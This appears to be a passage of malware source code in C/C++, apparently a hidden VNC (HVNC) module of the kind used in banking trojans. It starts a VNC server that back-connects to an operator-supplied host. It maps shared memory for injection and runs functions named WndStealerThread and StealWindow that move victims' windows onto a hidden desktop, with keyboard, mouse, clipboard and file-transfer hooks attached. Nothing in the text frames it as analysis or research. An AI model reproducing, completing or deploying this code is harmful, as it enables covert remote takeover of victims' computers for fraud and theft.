    rfbScreenInfoPtr rfbScreen=lpServer->rfbScreen=rfbGetScreen(NULL,NULL,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight,8,3,lpServer->DeskInfo.bBytesPerPixel);
    if (!rfbScreen)
    {
        lpServer->bActive=false;
        SetEvent(lpHandle->hEvent);
        return;
    }

    rfbScreen->screenData=lpServer;
    rfbScreen->desktopName=lpServer->DeskInfo.szDeskName;
    rfbScreen->frameBuffer=(char*)lpServer->DIBInfo.lpOldBkgBits;
    rfbScreen->alwaysShared=lpHandle->ConnInfo.bShared;
    rfbScreen->ptrAddEvent=OnPointerEvent;
    rfbScreen->kbdAddEvent=OnKeyboardEvent;
    rfbScreen->setXCutText=OnReceiveClipboard;
    rfbScreen->getFileTransferPermission=OnFileTransfer;
    rfbScreen->port=lpHandle->ConnInfo.wVNCPort;

    if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_VNC_CURSOR))
        SetXCursor(rfbScreen,&cur_arrow);
    else
        rfbScreen->cursor=NULL;

    if ((lpHandle->ConnInfo.szBCHost[0]) && (lpHandle->ConnInfo.wBCPort))
    {
        rfbScreen->backconnect=TRUE;
        lstrcpyA(rfbScreen->backconnectHost,lpHandle->ConnInfo.szBCHost);
        rfbScreen->bcPort=lpHandle->ConnInfo.wBCPort;
    }

    if (lpHandle->ConnInfo.Passwords.dwPasswordsCount)
    {
        DWORD dwPasswordsCount=lpHandle->ConnInfo.Passwords.dwPasswordsCount;
        PASSWORD_ITEM **lppPasswords=(PASSWORD_ITEM **)MemAlloc((dwPasswordsCount+1)*sizeof(PASSWORD_ITEM *));

        for (DWORD i=0; i < dwPasswordsCount; i++)
        {
            lppPasswords[i]=(PASSWORD_ITEM*)MemAlloc(sizeof(PASSWORD_ITEM));
            lppPasswords[i]->dwFlags=lpHandle->ConnInfo.Passwords.piPasswords[i].dwFlags;
            lstrcpyA(lppPasswords[i]->szPassword,lpHandle->ConnInfo.Passwords.piPasswords[i].szPassword);
        }
        rfbScreen->authPasswdData=lppPasswords;
        rfbScreen->passwordCheck=OnNewClientAuth;
    }
    else
        rfbScreen->newClientHook=OnNewClient;

    while (lpServer->bActive)
    {
        rfbInitServer(rfbScreen);

        if (rfbScreen->backconnect)
        {
            if (rfbScreen->connectSock < 0)
                lpServer->bActive=false;
        }
        else if (rfbScreen->listenSock < 0)
            lpServer->bActive=false;

        if (lpHandle->hEvent)
            SetEvent(lpHandle->hEvent);

        while ((rfbIsActive(rfbScreen)) && (IsConnectionActive(lpServer)))
        {
            if (WaitForSingleObject(lpServer->EventsInfo.hVNCKillEvent,0) != WAIT_TIMEOUT)
                break;

            if (!(lpServer->DeskInfo.dwFlags & HVNC_SCREEN_SIZE_DETERMINED))
            {
                if (WaitForSingleObject(hDispChangeEvent,0) == WAIT_OBJECT_0)
                    SetNewFramebuffer(lpServer,lpSharedVNCData->dwNewWidth,lpSharedVNCData->dwNewHeight,lpSharedVNCData->bNewBitsPerPixel);
            }

            if (WaitForSingleObject(lpServer->EventsInfo.hClipboardUpdatedEvent,0) == WAIT_OBJECT_0)
                SendClipboard(lpServer);

            if ((lpServer->DeskInfo.bInputDesktop) && (lpServer->EventsInfo.dwClients))
            {
                GetCursorPos(&lpServer->lpGlobalVNCData->ptCursor);

                rfbClientIteratorPtr i=rfbGetClientIteratorWithClosed(rfbScreen);
                rfbClientPtr cl=rfbClientIteratorHead(i);
                if (cl)
                    rfbDefaultPtrAddEvent(0,lpServer->lpGlobalVNCData->ptCursor.x,lpServer->lpGlobalVNCData->ptCursor.y,cl);
                rfbReleaseClientIterator(i);
            }

            rfbProcessEvents(rfbScreen,1000);
        }

        if (WaitForSingleObject(lpServer->EventsInfo.hVNCKillEvent,0) != WAIT_TIMEOUT)
            break;

        VNCDisconnectAllUsers(hVNC);
        rfbShutdownServer(rfbScreen,TRUE);
        if (lpServer->rfbScreen->backconnect)
        {
            DWORD dwTickCount=GetTickCount();
            if (dwTickCount-lpServer->dwLastReconnectionTime <= 1000)
            {
                if (++lpServer->dwReconnectionsCount >= MAX_RECONNECTIONS_PER_SECOND)
                {
                    lpServer->bActive=false;
                    break;
                }
            }
            else
                lpServer->dwReconnectionsCount=0;
            lpServer->dwLastReconnectionTime=dwTickCount;
        }
        rfbScreen->socketState=RFB_SOCKET_INIT;
        Sleep(1);
    }
    return;
}

bool VNCStartServer(HVNC hVNC,HVNC_CONNECTION_INFO *lpConnInfo)
{
    bool bRet=false;
    if (bHVNCInit)
    {
        HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
        if ((lpHandle) && (!lpHandle->lpServer->bActive))
        {
            memcpy(&lpHandle->ConnInfo,lpConnInfo,sizeof(lpHandle->ConnInfo));
            PHVNC lpServer=lpHandle->lpServer;
            lpServer->bStopped=false;
            if (!(lpServer->DeskInfo.dwFlags & HVNC_SCREEN_SIZE_DETERMINED))
                GetScreenInfo(lpServer);

            if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_INJECTS))
            {
                lpServer->hSharedMemMapping=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,lpServer->DIBInfo.dwScreenBufferSize,lpServer->Names.szSharedMemMappingName);
                lpServer->lpSharedMemMapping=(byte *)MapViewOfFile(lpServer->hSharedMemMapping,FILE_MAP_ALL_ACCESS,0,0,0);
            }
            InitScreen(lpServer,&lpServer->DIBInfo.lpOldBkgBits);
            ResetEvent(lpServer->EventsInfo.hVNCKillEvent);
            ResetEvent(lpServer->EventsInfo.hSendThreadMessageEvent);
            g_leave(hInputMutex);
            g_leave(hSharedMemMutex);
            g_leave(hPaintMutex);
            g_leave(hSendThreadMessageMutex);
            lpServer->bActive=true;
            lpHandle->hEvent=CreateEvent(NULL,true,false,NULL);
            SysCreateThread(lpServer,(LPTHREAD_START_ROUTINE)VNCServerThread,(LPDWORD)hVNC,true);
            WaitForSingleObject(lpHandle->hEvent,INFINITE);
            SysCloseHandle(lpHandle->hEvent);
            if (lpServer->bActive)
            {
                SysCreateThread(lpServer,(LPTHREAD_START_ROUTINE)ThreadsWatchThread,(LPDWORD)lpServer,true);
                bRet=true;
                if ((!lpServer->DeskInfo.bInputDesktop) && (!lpServer->DeskInfo.bWebCam))
                    SysCreateThread(lpServer,(LPTHREAD_START_ROUTINE)WndStealerThread,lpServer,true);
            }
            lpHandle->hEvent=NULL;
        }
    }
    return bRet;
}

int VNCGetServerStatus(HVNC hVNC)
{
    int dwRet=HVNC_ERROR;

    if (bHVNCInit)
    {
        HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
        if (lpHandle)
            dwRet=(lpHandle->lpServer->bActive) ? HVNC_SERVER_STARTED : HVNC_SERVER_NOT_STARTED;
    }
    return dwRet;
}

bool VNCStealWindow(HVNC hVNC,HWND hWnd)
{
    bool bRet=false;
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if ((lpHandle) && (lpHandle->lpServer) && (!(lpHandle->lpServer->DeskInfo.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK)))
        bRet=StealWindow(lpHandle->lpServer,hWnd);
    return bRet;
}

bool VNCReturnWindowToOwner(HVNC hVNC,HWND hWnd)
{
    bool bRet=false;
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if ((lpHandle) && (lpHandle->lpServer) && (!(lpHandle->lpServer->DeskInfo.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK)))
        bRet=ReturnWindowToOwner(lpHandle->lpServer,hWnd);
    return bRet;
}

